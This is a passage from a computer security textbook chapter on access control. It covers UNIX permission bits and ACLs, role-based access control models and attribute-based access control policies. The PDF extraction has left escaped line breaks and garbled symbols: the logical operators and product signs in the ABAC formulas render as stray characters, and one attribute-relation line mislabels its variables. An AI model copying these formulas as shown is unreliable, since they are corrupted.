class\\r\\nGroup class\\r\\nOther class\\r\\nM04_STAL0611_04_GE_C04.indd 140 10/11/17 2:47 PM\\n\\n\\n4.4 / EXAMPLE: UNIX FILE ACCESS CONTROL 141\\r\\nThe remaining three bits define special additional behavior for files or direc\\ufffetories. Two of these are the “set user ID” (SetUID) and “set group ID” (SetGID) \\r\\npermissions. If these are set on an executable file, the operating system functions as \\r\\nfollows. When a user (with execute privileges for this file) executes the file, the sys\\ufffetem temporarily allocates the rights of the user’s ID of the file creator, or the file’s \\r\\ngroup, respectively, to those of the user executing the file. These are known as the \\r\\n“effective user ID” and “effective group ID” and are used in addition to the “real user \\r\\nID” and “real group ID” of the executing user when making access control decisions \\r\\nfor this program. This change is only effective while the program is being executed. \\r\\nThis feature enables the creation and use of privileged programs that may use files \\r\\nnormally inaccessible to other users. It enables users to access certain files in a con\\ufffetrolled fashion. Alternatively, when applied to a directory, the SetGID permission \\r\\nindicates that newly created files will inherit the group of this directory. The SetUID \\r\\npermission is ignored.\\r\\nThe final permission bit is the “sticky” bit. When set on a file, this originally indi\\ufffecated that the system should retain the file contents in memory following execution. \\r\\nThis is no longer used. When applied to a directory, though, it specifies that only the \\r\\nowner of any file in the directory can rename, move, or delete that file. This is useful \\r\\nfor managing files in shared temporary directories.\\r\\nOne particular user ID is designated as “superuser.” The superuser is exempt \\r\\nfrom the usual file access control constraints and has systemwide access. Any pro\\ufffegram that is owned by, and SetUID to, the “superuser” potentially grants unrestricted \\r\\naccess to the system to any user executing that program. Hence great care is needed \\r\\nwhen writing such programs.\\r\\nThis access scheme is adequate when file access requirements align with users \\r\\nand a modest number of groups of users. For example, suppose a user wants to give \\r\\nread access for file X to users A and B, and read access for file Y to users B and C. \\r\\nWe would need at least two user groups, and user B would need to belong to both \\r\\ngroups in order to access the two files. However, if there are a large number of differ\\ufffeent groupings of users requiring a range of access rights to different files, then a very \\r\\nlarge number of groups may be needed to provide this. This rapidly becomes unwieldy \\r\\nand difficult to manage, if even possible at all.2\\r\\n One way to overcome this problem is \\r\\nto use access control lists, which are provided in most modern UNIX systems.\\r\\nA final point to note is that the traditional UNIX file access control scheme \\r\\nimplements a simple protection domain structure. A domain is associated with the \\r\\nuser, and switching the domain corresponds to changing the user ID temporarily.\\r\\nAccess Control Lists in UNIX\\r\\nMany modern UNIX and UNIX-based operating systems support access control \\r\\nlists, including FreeBSD, OpenBSD, Linux, and Solaris. In this section, we describe \\r\\nFreeBSD, but other implementations have essentially the same features and interface. \\r\\nThe feature is referred to as extended access control list, while the traditional UNIX \\r\\napproach is referred to as minimal access control list.\\r\\n2\\r\\nMost UNIX systems impose a limit on the maximum number of groups to which any user may belong, as \\r\\nwell as to the total number of groups possible on the system.\\r\\nM04_STAL0611_04_GE_C04.indd 141 10/11/17 2:47 PM\\n\\n\\n142 CHAPTER 4 / ACCESS CONTROL\\r\\nFreeBSD allows the administrator to assign a list of UNIX user IDs and \\r\\ngroups to a file by using the setfacl command. Any number of users and groups \\r\\ncan be associated with a file, each with three protection bits (read, write, execute), \\r\\noffering a flexible mechanism for assigning access rights. A file need not have an \\r\\nACL but may be protected solely by the traditional UNIX file access mechanism. \\r\\nFreeBSD files include an additional protection bit that indicates whether the file \\r\\nhas an extended ACL.\\r\\nFreeBSD and most UNIX implementations that support extended ACLs use \\r\\nthe following strategy (e.g., Figure 4.5b):\\r\\n1. The owner class and other class entries in the 9-bit permission field have the \\r\\nsame meaning as in the minimal ACL case.\\r\\n2. The group class entry specifies the permissions for the owner group for this file. \\r\\nThese permissions represent the maximum permissions that can be assigned to \\r\\nnamed users or named groups, other than the owning user. In this latter role, the \\r\\ngroup class entry functions as a mask.\\r\\n3. Additional named users and named groups may be associated with the file, each \\r\\nwith a 3-bit permission field. The permissions listed for a named user or named \\r\\ngroup are compared to the mask field. Any permission for the named user or \\r\\nnamed group that is not present in the mask field is disallowed.\\r\\nWhen a process requests access to a file system object, two steps are performed. \\r\\nStep 1 selects the ACL entry that most closely matches the requesting process. The \\r\\nACL entries are looked at in the following order: owner, named users, (owning or \\r\\nnamed) groups, others. Only a single entry determines access. Step 2 checks if the \\r\\nmatching entry contains sufficient permissions. A process can be a member in more \\r\\nthan one group; so more than one group entry can match. If any of these matching \\r\\ngroup entries contain the requested permissions, one that contains the requested per\\ufffemissions is picked (the result is the same no matter which entry is picked). If none of \\r\\nthe matching group entries contains the requested permissions, access will be denied \\r\\nno matter which entry is picked.\\r\\n4.5 ROLE-BASED ACCESS CONTROL\\r\\nTraditional DAC systems define the access rights of individual users and groups of \\r\\nusers. In contrast, RBAC is based on the roles that users assume in a system rather \\r\\nthan the user’s identity. Typically, RBAC models define a role as a job function within \\r\\nan organization. RBAC systems assign access rights to roles instead of individual \\r\\nusers. In turn, users are assigned to different roles, either statically or dynamically, \\r\\naccording to their responsibilities.\\r\\nRBAC now enjoys widespread commercial use and remains an area of active \\r\\nresearch. The National Institute of Standards and Technology (NIST) has issued a stan\\ufffedard, FIPS PUB 140-3 (Security Requirements for Cryptographic Modules, September \\r\\n2009), that requires support for access control and administration through roles.\\r\\nThe relationship of users to roles is many to many, as is the relationship of roles \\r\\nto resources, or system objects (see Figure 4.6). The set of users changes, in some \\r\\nM04_STAL0611_04_GE_C04.indd 142 10/11/17 2:47 PM\\n\\n\\n4.5 / ROLE-BASED ACCESS CONTROL 143\\r\\nenvironments frequently, and the assignment of a user to one or more roles may also \\r\\nbe dynamic. The set of roles in the system in most environments is relatively static, \\r\\nwith only occasional additions or deletions. Each role will have specific access rights \\r\\nto one or more resources. The set of resources and the specific access rights associated \\r\\nwith a particular role are also likely to change infrequently.\\r\\nWe can use the access matrix representation to depict the key elements of an \\r\\nRBAC system in simple terms, as shown in Figure 4.7. The upper matrix relates \\r\\nindividual users to roles. Typically there are many more users than roles. Each matrix \\r\\nentry is either blank or marked, the latter indicating that this user is assigned to this \\r\\nrole. Note a single user may be assigned multiple roles (more than one mark in a \\r\\nrow) and multiple users may be assigned to a single role (more than one mark in a \\r\\nFigure 4.6 Users, Roles, and Resources\\r\\nRole 1\\r\\nUsers Roles Resources\\r\\nRole 2\\r\\nRole 3\\r\\nM04_STAL0611_04_GE_C04.indd 143 10/11/17 2:47 PM\\n\\n\\n144 CHAPTER 4 / ACCESS CONTROL\\r\\ncolumn). The lower matrix has the same structure as the DAC access control matrix, \\r\\nwith roles as subjects. Typically, there are few roles and many objects, or resources. In \\r\\nthis matrix, the entries are the specific access rights enjoyed by the roles. Note a role \\r\\ncan be treated as an object, allowing the definition of role hierarchies.\\r\\nRBAC lends itself to an effective implementation of the principle of least privi\\ufffelege, referred to in Chapter 1. Each role should contain the minimum set of access \\r\\nFigure 4.7 Access Control Matrix Representation of RBAC\\r\\nR1 R2 P1 P2\\r\\nR1\\r\\nU1\\r\\nU2\\r\\nU3\\r\\nU4\\r\\nU5\\r\\nU6\\r\\nUm\\r\\nR2\\r\\nRn F1 F2\\r\\nRn\\r\\nD1 D2\\r\\nROLES\\r\\nOBJECTS\\r\\nR1\\r\\nR2\\r\\nRn\\r\\ncontrol owner\\r\\ncontrol\\r\\nwrite\\r\\nwrite * execute\\r\\nstop\\r\\nwakeup wakeup seek\\r\\nseek *\\r\\nread\\r\\nowner\\r\\nowner\\r\\nread * owner\\r\\ncontrol\\r\\ncontrol\\r\\nowner\\r\\nM04_STAL0611_04_GE_C04.indd 144 10/11/17 2:47 PM\\n\\n\\n4.5 / ROLE-BASED ACCESS CONTROL 145\\r\\nrights needed for that role. A user is assigned to a role that enables him or her to \\r\\nperform only what is required for that role. Multiple users assigned to the same role \\r\\nenjoy the same minimal set of access rights.\\r\\nRBAC Reference Models\\r\\nA variety of functions and services can be included under the general RBAC \\r\\napproach. To clarify the various aspects of RBAC, it is useful to define a set of abstract \\r\\nmodels of RBAC functionality.\\r\\n[SAND96] defines a family of reference models that has served as the basis for \\r\\nongoing standardization efforts. This family consists of four models that are related \\r\\nto each other, as shown in Figure 4.8a and Table 4.4. RBAC0 contains the minimum \\r\\nfunctionality for an RBAC system. RBAC1 includes the RBAC0 functionality and \\r\\nadds role hierarchies, which enable one role to inherit permissions from another role. \\r\\nRBAC2 includes RBAC0 and adds constraints, which restrict the ways in which the \\r\\nFigure 4.8 A Family of Role-Based Access Control Models RBAC0 is the \\r\\nminimum requirement for an RBAC system. RBAC1 adds role hierarchies \\r\\nand RBAC2 adds constraints. RBAC3 includes RBAC1 and RBAC2.\\r\\nPermissions\\r\\n(a) Relationship among RBAC models\\r\\n(b) RBAC models\\r\\nRBAC0\\r\\nBase model\\r\\nRBAC3\\r\\nConsolidated model\\r\\nRBAC1\\r\\nRole hierarchies\\r\\nRBAC2\\r\\nConstraints\\r\\nUsers\\r\\nuser_sessions session_roles\\r\\n User\\r\\nassignment (UA)\\r\\nPermission\\r\\nassignment (PA)\\r\\nRole\\r\\nhierarchy (RH)\\r\\nSessions\\r\\nObjects\\r\\nOper\\ufffeations\\r\\nRoles\\r\\nM04_STAL0611_04_GE_C04.indd 145 10/11/17 2:47 PM\\n\\n\\n146 CHAPTER 4 / ACCESS CONTROL\\r\\ncomponents of an RBAC system may be configured. RBAC3 contains the functional\\ufffeity of RBAC0, RBAC1, and RBAC2.\\r\\nBASE MODEL—RBAC0 Figure 4.8b, without the role hierarchy and constraints, \\r\\ncontains the four types of entities in an RBAC0 system:\\r\\n• User: An individual that has access to this computer system. Each individual \\r\\nhas an associated user ID.\\r\\n• Role: A named job function within the organization that controls this computer \\r\\nsystem. Typically, associated with each role is a description of the authority and \\r\\nresponsibility conferred on this role, and on any user who assumes this role.\\r\\n• Permission: An approval of a particular mode of access to one or more objects. \\r\\nEquivalent terms are access right, privilege, and authorization.\\r\\n• Session: A mapping between a user and an activated subset of the set of roles \\r\\nto which the user is assigned.\\r\\nThe arrowed lines in Figure 4.8b indicate relationships, or mappings, with a \\r\\nsingle arrowhead indicating one, and a double arrowhead indicating many. Thus, there \\r\\nis a many-to-many relationship between users and roles: One user may have multiple \\r\\nroles, and multiple users may be assigned to a single role. Similarly, there is a many\\ufffeto-many relationship between roles and permissions. A session is used to define a \\r\\ntemporary one-to-many relationship between a user and one or more of the roles to \\r\\nwhich the user has been assigned. The user establishes a session with only the roles \\r\\nneeded for a particular task; this is an example of the concept of least privilege.\\r\\nThe many-to-many relationships between users and roles and between roles \\r\\nand permissions provide a flexibility and granularity of assignment not found in con\\ufffeventional DAC schemes. Without this flexibility and granularity, there is a greater risk \\r\\nthat a user may be granted more access to resources than is needed because of the \\r\\nlimited control over the types of access that can be allowed. The NIST RBAC docu\\ufffement gives the following examples: Users may need to list directories and modify \\r\\nexisting files without creating new files, or they may need to append records to a file \\r\\nwithout modifying existing records.\\r\\nROLE HIERARCHIES—RBAC1 Role hierarchies provide a means of reflecting the \\r\\nhierarchical structure of roles in an organization. Typically, job functions with greater \\r\\nresponsibility have greater authority to access resources. A subordinate job function \\r\\nmay have a subset of the access rights of the superior job function. Role hierarchies \\r\\nmake use of the concept of inheritance to enable one role to implicitly include access \\r\\nrights associated with a subordinate role.\\r\\nModels Hierarchies Constraints\\r\\nRBAC0 No No\\r\\nRBAC1 Yes No\\r\\nRBAC2 No Yes\\r\\nRBAC3 Yes Yes\\r\\nTable 4.4 Scope RBAC Models\\r\\nM04_STAL0611_04_GE_C04.indd 146 10/11/17 2:47 PM\\n\\n\\n4.5 / ROLE-BASED ACCESS CONTROL 147\\r\\nFigure 4.9 is an example of a diagram of a role hierarchy. By convention, sub\\ufffeordinate roles are lower in the diagram. A line between two roles implies the upper \\r\\nrole includes all of the access rights of the lower role, as well as other access rights not \\r\\navailable to the lower role. One role can inherit access rights from multiple subordi\\ufffenate roles. For example, in Figure 4.9, the Project Lead role includes all of the access \\r\\nrights of the Production Engineer role and of the Quality Engineer role. More than \\r\\none role can inherit from the same subordinate role. For example, both the Produc\\ufffetion Engineer role and the Quality Engineer role include all of the access rights of \\r\\nthe Engineer role. Additional access rights are also assigned to the Production Engi\\ufffeneer Role, and a different set of additional access rights are assigned to the Quality \\r\\nEngineer role. Thus, these two roles have overlapping access rights, namely, the access \\r\\nrights they share with the Engineer role.\\r\\nCONSTRAINTS—RBAC2 Constraints provide a means of adapting RBAC to the \\r\\nspecifics of administrative and security policies in an organization. A constraint is a \\r\\ndefined relationship among roles or a condition related to roles. [SAND96] lists the fol\\ufffelowing types of constraints: mutually exclusive roles, cardinality, and prerequisite roles.\\r\\nMutually exclusive roles are roles such that a user can be assigned to only one \\r\\nrole in the set. This limitation could be a static one, or it could be dynamic, in the \\r\\nsense that a user could be assigned only one of the roles in the set for a session. The \\r\\nmutually exclusive constraint supports a separation of duties and capabilities within \\r\\nan organization. This separation can be reinforced or enhanced by use of mutually \\r\\nexclusive permission assignments. With this additional constraint, a mutually exclu\\ufffesive set of roles has the following properties:\\r\\n1. A user can only be assigned to one role in the set (either during a session or \\r\\nstatically).\\r\\n2. Any permission (access right) can be granted to only one role in the set.\\r\\nFigure 4.9 Example of Role Hierarchy\\r\\nDirector\\r\\nEngineering dept.\\r\\nEngineer 1\\r\\nProduction\\r\\nEngineer 1\\r\\nQuality\\r\\nEngineer 1\\r\\nProject Lead 1\\r\\nEngineer 2\\r\\nProduction\\r\\nEngineer 2\\r\\nQuality\\r\\nEngineer 2\\r\\nProject Lead 2\\r\\nM04_STAL0611_04_GE_C04.indd 147 10/11/17 2:47 PM\\n\\n\\n148 CHAPTER 4 / ACCESS CONTROL\\r\\nThus, the set of mutually exclusive roles have non overlapping permissions. If \\r\\ntwo users are assigned to different roles in the set, then the users have non overlapping \\r\\npermissions while assuming those roles. The purpose of mutually exclusive roles is to \\r\\nincrease the difficulty of collusion among individuals of different skills or divergent \\r\\njob functions to thwart security policies.\\r\\nCardinality refers to setting a maximum number with respect to roles. One such \\r\\nconstraint is to set a maximum number of users that can be assigned to a given role. \\r\\nFor example, a project leader role or a department head role might be limited to a \\r\\nsingle user. The system could also impose a constraint on the number of roles that \\r\\na user is assigned to, or the number of roles a user can activate for a single session. \\r\\nAnother form of constraint is to set a maximum number of roles that can be granted \\r\\na particular permission; this might be a desirable risk mitigation technique for a sensi\\ufffetive or powerful permission.\\r\\nA system might be able to specify a prerequisite role, which dictates a user can \\r\\nonly be assigned to a particular role if it is already assigned to some other specified \\r\\nrole. A prerequisite can be used to structure the implementation of the least privilege \\r\\nconcept. In a hierarchy, it might be required that a user can be assigned to a senior \\r\\n(higher) role only if it is already assigned an immediately junior (lower) role. For \\r\\nexample, in Figure 4.9 a user assigned to a Project Lead role must also be assigned to \\r\\nthe subordinate Production Engineer and Quality Engineer roles. Then, if the user \\r\\ndoes not need all of the permissions of the Project Lead role for a given task, the \\r\\nuser can invoke a session using only the required subordinate role. Note the use of \\r\\nprerequisites tied to the concept of hierarchy requires the RBAC3 model.\\r\\n4.6 ATTRIBUTE-BASED ACCESS CONTROL\\r\\nA relatively recent development in access control technology is the attribute-based \\r\\naccess control (ABAC) model. An ABAC model can define authorizations that \\r\\nexpress conditions on properties of both the resource and the subject. For example, \\r\\nconsider a configuration in which each resource has an attribute that identifies the \\r\\nsubject that created the resource. Then, a single access rule can specify the owner\\ufffeship privilege for all the creators of every resource. The strength of the ABAC \\r\\napproach is its flexibility and expressive power. [PLAT13] points out that the main \\r\\nobstacle to its adoption in real systems has been concern about the performance \\r\\nimpact of evaluating predicates on both resource and user properties for each access. \\r\\nHowever, for applications such as cooperating Web services and cloud comput\\ufffeing, this increased performance cost is less noticeable because there is already a \\r\\nrelatively high performance cost for each access. Thus, Web services have been pio\\ufffeneering technologies for implementing ABAC models, especially through the intro\\ufffeduction of the eXtensible Access Control Markup Language (XAMCL) [BEUC13], \\r\\nand there is considerable interest in applying the ABAC model to cloud services \\r\\n[IQBA12, YANG12].\\r\\nThere are three key elements to an ABAC model: attributes, which are defined \\r\\nfor entities in a configuration; a policy model, which defines the ABAC policies; and \\r\\nthe architecture model, which applies to policies that enforce access control. We will \\r\\nexamine these elements in turn.\\r\\nM04_STAL0611_04_GE_C04.indd 148 10/11/17 2:47 PM\\n\\n\\n4.6 / ATTRIBUTE-BASED ACCESS CONTROL 149\\r\\nAttributes\\r\\nAttributes are characteristics that define specific aspects of the subject, object, envi\\uffferonment conditions, and/or requested operations that are predefined and preassigned \\r\\nby an authority. Attributes contain information that indicates the class of informa\\ufffetion given by the attribute, a name, and a value (e.g., Class = HospitalRecordsAccess, \\r\\nName = PatientInformationAccess, Value = MFBusinessHoursOnly).\\r\\nThe following are the three types of attributes in the ABAC model:\\r\\n• Subject attributes: A subject is an active entity (e.g., a user, an application, a \\r\\nprocess, or a device) that causes information to flow among objects or changes \\r\\nthe system state. Each subject has associated attributes that define the identity \\r\\nand characteristics of the subject. Such attributes may include the subject’s \\r\\nidentifier, name, organization, job title, and so on. A subject’s role can also be \\r\\nviewed as an attribute.\\r\\n• Object attributes: An object, also referred to as a resource, is a passive (in the \\r\\ncontext of the given request) information system–related entity (e.g., devices, \\r\\nfiles, records, tables, processes, programs, networks, domains) containing or \\r\\nreceiving information. As with subjects, objects have attributes that can be lever\\ufffeaged to make access control decisions. A Microsoft Word document, for example, \\r\\nmay have attributes such as title, subject, date, and author. Object attributes can \\r\\noften be extracted from the metadata of the object. In particular, a variety of \\r\\nWeb service metadata attributes may be relevant for access control purposes, \\r\\nsuch as ownership, service taxonomy, or even Quality of Service (QoS) attributes.\\r\\n• Environment attributes: These attributes have so far been largely ignored in \\r\\nmost access control policies. They describe the operational, technical, and even \\r\\nsituational environment or context in which the information access occurs. For \\r\\nexample, attributes, such as current date and time, the current virus/hacker \\r\\nactivities, and the network’s security level (e.g., Internet vs. intranet), are not \\r\\nassociated with a particular subject nor a resource, but may nonetheless be \\r\\nrelevant in applying an access control policy.\\r\\nABAC is a logical access control model that is distinguishable because it con\\ufffetrols access to objects by evaluating rules against the attributes of entities (subject \\r\\nand object), operations, and the environment relevant to a request. ABAC relies \\r\\nupon the evaluation of attributes of the subject, attributes of the object, and a for\\ufffemal relationship or access control rule defining the allowable operations for subject\\ufffeobject attribute combinations in a given environment. All ABAC solutions contain \\r\\nthese basic core capabilities to evaluate attributes and enforce rules or relationships \\r\\nbetween those attributes. ABAC systems are capable of enforcing DAC, RBAC, and \\r\\nMAC concepts. ABAC enables fine-grained access control, which allows for a higher \\r\\nnumber of discrete inputs into an access control decision, providing a bigger set of \\r\\npossible combinations of those variables to reflect a larger and more definitive set \\r\\nof possible rules, policies, or restrictions on access. Thus, ABAC allows an unlimited \\r\\nnumber of attributes to be combined to satisfy any access control rule. Moreover, \\r\\nABAC systems can be implemented to satisfy a wide array of requirements from \\r\\nbasic access control lists through advanced expressive policy models that fully lever\\ufffeage the flexibility of ABAC.\\r\\nM04_STAL0611_04_GE_C04.indd 149 10/11/17 2:47 PM\\n\\n\\n150 CHAPTER 4 / ACCESS CONTROL\\r\\nABAC Logical Architecture\\r\\nFigure 4.10 illustrates in a logical architecture the essential components of an ABAC \\r\\nsystem. An access by a subject to an object proceeds according to the following steps:\\r\\n1. A subject requests access to an object. This request is routed to an access control \\r\\nmechanism.\\r\\n2. The access control mechanism is governed by a set of rules (2a) that are defined \\r\\nby a preconfigured access control policy. Based on these rules, the access control \\r\\nmechanism assesses the attributes of the subject (2b), object (2c), and current \\r\\nenvironmental conditions (2d) to determine authorization.\\r\\n3. The access control mechanism grants the subject access to the object if access \\r\\nis authorized, and denies access if it is not authorized.\\r\\nIt is clear from the logical architecture that there are four independent sources \\r\\nof information used for the access control decision. The system designer can decide \\r\\nwhich attributes are important for access control with respect to subjects, objects, and \\r\\nFigure 4.10 ABAC Scenario\\r\\nSubject\\r\\nattributes\\r\\nEnvironmental\\r\\nattributes\\r\\nAccess control\\r\\npolicies\\r\\nAccess\\r\\ncontrol\\r\\nmechanism\\r\\nPermit\\r\\nDeny\\r\\nSubject (user)\\r\\n2a\\r\\n2b 2c 2d\\r\\n1 3\\r\\nClearance Name\\r\\nEtc. Security\\r\\nTemperature Time\\r\\nEtc.\\r\\nObject\\r\\nattributes\\r\\nClassification\\r\\nOwner Type\\r\\nEtc.\\r\\nM04_STAL0611_04_GE_C04.indd 150 10/11/17 2:47 PM\\n\\n\\n4.6 / ATTRIBUTE-BASED ACCESS CONTROL 151\\r\\nenvironmental conditions. The system designer or other authority can then define \\r\\naccess control policies, in the form of rules, for any desired combination of attri\\ufffebutes of subject, object, and environmental conditions. It should be evident that this \\r\\napproach is very powerful and flexible. However, the cost, both in terms of the com\\ufffeplexity of the design and implementation, and in terms of the performance impact, \\r\\nis likely to exceed that of other access control approaches. This is a trade-off that the \\r\\nsystem authority must make.\\r\\nFigure 4.11, taken from NIST SP 800-162 [Guide to Attribute Based Access Con\\ufffetrol (ABAC) Definition and Considerations, January 2014], provides a useful way \\r\\nof grasping the scope of an ABAC model compared to a DAC model using access \\r\\ncontrol lists (ACLs). This figure not only illustrates the relative complexity of the two \\r\\nmodels, but also clarifies the trust requirements of the two models. A comparison \\r\\nof representative trust relationships (indicated by arrowed lines) for ACL use and \\r\\nABAC use shows that there are many more complex trust relationships required for \\r\\nABAC to work properly. Ignoring the commonalities in both parts of Figure 4.11, \\r\\none can observe that with ACLs the root of trust is with the object owner, who ulti\\ufffemately enforces the object access rules by provisioning access to the object through \\r\\naddition of a user to an ACL. In ABAC, the root of trust is derived from many sources \\r\\nof which the object owner has no control, such as Subject Attribute Authorities, \\r\\nPolicy Developers, and Credential Issuers. Accordingly, SP 800-162 recommended \\r\\nthat an enterprise governance body be formed to manage all identity, credential, \\r\\nand access management capability deployment and operation and that each sub\\ufffeordinate organization maintain a similar body to ensure consistency in managing \\r\\nthe deployment and paradigm shift associated with enterprise ABAC implementa\\ufffetion. Additionally, it is recommended that an enterprise develop a trust model that \\r\\ncan be used to illustrate the trust relationships and help determine ownership and \\r\\nliability of information and services, needs for additional policy and governance, and \\r\\nrequirements for technical solutions to validate or enforce trust relationships. The \\r\\ntrust model can be used to help influence organizations to share their information \\r\\nwith clear expectations of how that information will be used and protected and to \\r\\nbe able to trust the information and attribute and authorization assertions coming \\r\\nfrom other organizations.\\r\\nABAC Policies\\r\\nA policy is a set of rules and relationships that govern allowable behavior within an \\r\\norganization, based on the privileges of subjects and how resources or objects are to \\r\\nbe protected under which environment conditions. In turn, privileges represent the \\r\\nauthorized behavior of a subject; they are defined by an authority and embodied \\r\\nin a policy. Other terms that are commonly used instead of privileges are rights, \\r\\nauthorizations, and entitlements. Policy is typically written from the perspective of \\r\\nthe object that needs protecting, and the privileges available to subjects.\\r\\nWe now define an ABAC policy model, based on the model presented in \\r\\n[YUAN05]. The following conventions are used:\\r\\n1. S, O, and E are subjects, objects, and environments, respectively;\\r\\n2. SAk (1 … k … K), OAm (1 … m … M), and EAn (1 … n … N) are the pre\\ufffedefined attributes for subjects, objects, and environments, respectively;\\r\\nM04_STAL0611_04_GE_C04.indd 151 10/11/17 2:47 PM\\n\\n\\n152 CHAPTER 4 / ACCESS CONTROL\\r\\nFigure 4.11 ACL and ABAC Trust Relationships\\r\\nProper\\r\\ncredential issuance\\r\\nCredential validation\\r\\nNetwork\\r\\nauthentication\\r\\nObject access rule enforcement\\r\\nAccess provisioning\\r\\nGroup management\\r\\nNetwork\\r\\ncredential\\r\\nDigital identity\\r\\nprovisioning\\r\\nStrength of\\r\\ncredential protection\\r\\nPhysical\\r\\naccess\\r\\n(a) ACL Trust Chain\\r\\nIdentity\\r\\ncredential\\r\\nSubject Authentication Object\\r\\nNetwork access Access control list\\r\\nAccess control\\r\\ndecision\\r\\nAccess control\\r\\nenforcement\\r\\nProper\\r\\ncredential issuance\\r\\nCredential validation\\r\\nNetwork\\r\\nauthentication\\r\\nAuthoritative\\r\\nobject attributes\\r\\nObject access rule enforcement\\r\\nAccess provisioning\\r\\nGroup management\\r\\nNetwork\\r\\ncredential\\r\\nDigital identity\\r\\nprovisioning\\r\\nStrength of\\r\\ncredential protection\\r\\nPhysical\\r\\naccess\\r\\n(b) ABAC Trust Chain\\r\\nAuthoritative subject\\r\\nattribute stores\\r\\nAttribute provisioning\\r\\nAttribute integrity\\r\\nCommon subject\\r\\nattribute taxonomy\\r\\nCommon object\\r\\nattribute taxonomy\\r\\nAttribute integrity\\r\\nIdentity\\r\\ncredential\\r\\nSubject\\r\\nattributes\\r\\nObject\\r\\nattributes\\r\\nSubject Authentication Object\\r\\nNetwork access Rules\\r\\nAccess control\\r\\ndecision\\r\\nAccess control\\r\\nenforcement\\r\\n3. ATTR(s), ATTR(o), and ATTR(e) are attribute assignment relations for subject \\r\\ns, object o, and environment e, respectively:\\r\\nATTR(s) ⊆ SA1 × SA2 ×\\xa0...\\xa0× SAK\\r\\nATTR(r) ⊆ OA1 × OA2 ×\\xa0...\\xa0× OAM\\r\\nATTR(o) ⊆ EA1 × EA2 ×\\xa0...\\xa0× EAN\\r\\nM04_STAL0611_04_GE_C04.indd 152 10/11/17 2:47 PM\\n\\n\\n4.6 / ATTRIBUTE-BASED ACCESS CONTROL 153\\r\\nWe also use the function notation for the value assignment of individual attributes. \\r\\nFor example:\\r\\nRole(s) = “Service Consumer”\\r\\nServiceOwner(o) = “XYZ, Inc.”\\r\\nCurrentDate(e) = “01-23-2005”\\r\\n4. In the most general form, a Policy Rule, which decides on whether a subject s\\r\\ncan access an object o in a particular environment e, is a Boolean function of the \\r\\nattributes of s, o, and e:\\r\\nRule: can_access (s, o, e) d f(ATTR(s), ATTR(o), ATTR(e))\\r\\nGiven all the attribute assignments of s, o, and e, if the function’s evaluation is true, \\r\\nthen the access to the resource is granted; otherwise the access is denied.\\r\\n5. A policy rule base or policy store may consist of a number of policy rules, cov\\ufffeering many subjects and objects within a security domain. The access control \\r\\ndecision process in essence amounts to the evaluation of applicable policy rules \\r\\nin the policy store.\\r\\nNow consider the example of an online entertainment store that streams movies \\r\\nto users for a flat monthly fee. We will use this example to contrast RBAC and ABAC \\r\\napproaches. The store must enforce the following access control policy based on the \\r\\nuser’s age and the movie’s content rating:\\r\\nMovie Rating Users Allowed Access\\r\\nR Age 17 and older\\r\\nPG-13 Age 13 and older\\r\\nG Everyone\\r\\nIn an RBAC model, every user would be assigned one of three roles: Adult, \\r\\nJuvenile, or Child, possibly during registration. There would be three permis\\ufffesions created: Can view R-rated movies, Can view PG-13-rated movies, and Can \\r\\nview G-rated movies. The Adult role gets assigned with all three permissions; the \\r\\nJuvenile role gets Can view PG-13-rated movies and Can view G-rated movies \\r\\npermissions, and the Child role gets the Can view G-rated movies permission only. \\r\\nBoth the user-to-role and permission-to-role assignments are manual administra\\ufffetive tasks.\\r\\nThe ABAC approach to this application does not need to explicitly define roles. \\r\\nInstead, whether a user u can access or view a movie m (in a security environment \\r\\ne which is ignored here) would be resolved by evaluating a policy rule such as the \\r\\nfollowing:\\r\\nR1:can_access(u, m, e) d\\r\\n (Age(u) ≥ 17 ¿ Rating(m) ∈ {R, PG-13, G}) ¡\\r\\n (Age(u) ≥ 13 ¿ Age(u) < 17 ¿ Rating(m) ∈ {PG-13, G}) ¡\\r\\n (Age(u) < 13 ¿ Rating(m) ∈ {G})\\r\\nM04_STAL0611_04_GE_C04.indd 153 10/11/17 2:47 PM\\n\\n\\n154 CHAPTER 4 / ACCESS CONTROL\\r\\nwhere Age and Rating are the subject attribute and the object attribute, respectively. \\r\\nThe advantage of the ABAC model shown here is that it eliminates the definition and \\r\\nmanagement of static roles, hence eliminating the need for the administrative tasks \\r\\nfor user-to-role assignment and permission-to-role assignment.\\r\\nThe advantage of ABAC is more clearly seen when we impose finer-grained \\r\\npolicies. For example, suppose movies are classified as either New Release or Old \\r\\nRelease, based on release date compared to the current date, and users are classi\\ufffefied as Premium User and Regular User, based on the fee they pay. We would like \\r\\nto enforce a policy that only premium users can view new movies. For the RBAC \\r\\nmodel, we would have to double the number of roles, to distinguish each user \\r\\nby age and fee, and we would have to double the number of separate permissions \\r\\nas well.\\r\\nIn general, if there are K subject attributes and M object attributes, and if for \\r\\neach attribute, Range() denotes the range of possible values it can take, then the \\r\\nrespective number of roles and permissions required for an RBAC model are:\\r\\nq\\r\\nK\\r\\nk=1\\r\\nRange (SAk) and q\\r\\nM\\r\\nm=1\\r\\nRange (SAm)\\r\\nThus, we can see that as the number of attributes increases to accommodate \\r\\nfiner-grained policies, the number of roles and permissions grows exponentially. \\r\\nIn contrast, the ABAC model deals with additional attributes in an efficient way. \\r\\nFor this example, the policy R1 defined previously still applies. We need two new \\r\\nrules:\\r\\nR2:can_access(u, m, e) d\\r\\n (MembershipType(u) = Premium) ¡\\r\\n (MembershipType(u) = Regular ¿ MovieType(m) = OldRelease)\\r\\nR3:can_access(u, m, e) d R1 ¿ R2\\r\\nWith the ABAC model, it is also easy to add environmental attributes. Suppose \\r\\nwe wish to add a new policy rule that is expressed in words as follows: Regular users \\r\\nare allowed to view new releases in promotional periods. This would be difficult to \\r\\nexpress in an RBAC model. In an ABAC model, we only need to add a conjunctive \\r\\n(AND) rule that checks to see the environmental attribute today’s date falls in a \\r\\npromotional period.\\r\\n4.7 IDENTITY, CREDENTIAL, AND ACCESS MANAGEMENT\\r\\nWe now examine some concepts that are relevant to an access control approach \\r\\ncentered on attributes. This section provides an overview of the concept of identity, \\r\\ncredential, and access management (ICAM), and then Section 4.8 will discuss the use \\r\\nof a trust framework for exchanging attributes.\\r\\nICAM is a comprehensive approach to managing and implementing digital \\r\\nidentities (and associated attributes), credentials, and access control. ICAM has been \\r\\ndeveloped by the U.S. government, but is applicable not only to government agencies, \\r\\nM04_STAL0611_04_GE_C04.indd 154 10/11/17 2:47 PM\\n\\n\\n4.7 / IDENTITY, CREDENTIAL, AND ACCESS MANAGEMENT 155\\r\\nbut also may be deployed by enterprises looking for a unified approach to access \\r\\ncontrol. ICAM is designed 